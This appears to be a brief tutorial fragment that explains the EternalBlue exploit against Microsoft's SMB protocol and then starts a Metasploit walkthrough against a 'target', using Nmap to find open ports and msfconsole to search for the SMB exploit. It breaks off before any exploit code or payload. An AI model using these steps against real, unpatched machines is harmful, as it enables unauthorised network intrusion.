EternalBlue is an exploit that allows cyber threat actors to remotely execute arbitrary code and
gain access to a network by sending specially crafted packets.EternalBlue exploits a vulnerability
in the Microsoft implementation of the Server Message Block (SMB) Protocol. This dupes a Windows machine
that has not been patched against the vulnerability into allowing illegitimate data packets into the legitimate network
Due to EternalBlue’s ability to compromise networks, if one device is infected by malware
via EternalBlue, every device connected to the network is at risk. This makes recovery difficult,
as all devices on a network may have to be taken offline for remediation.
===========
Use Nmap for finding any network with openports
Open Terminal and run the command
 Msfconsole
With Metasploit running, the first step is to search for the vulnerability or exploit we’re
interested in. In our case, we know our target is running SMB.
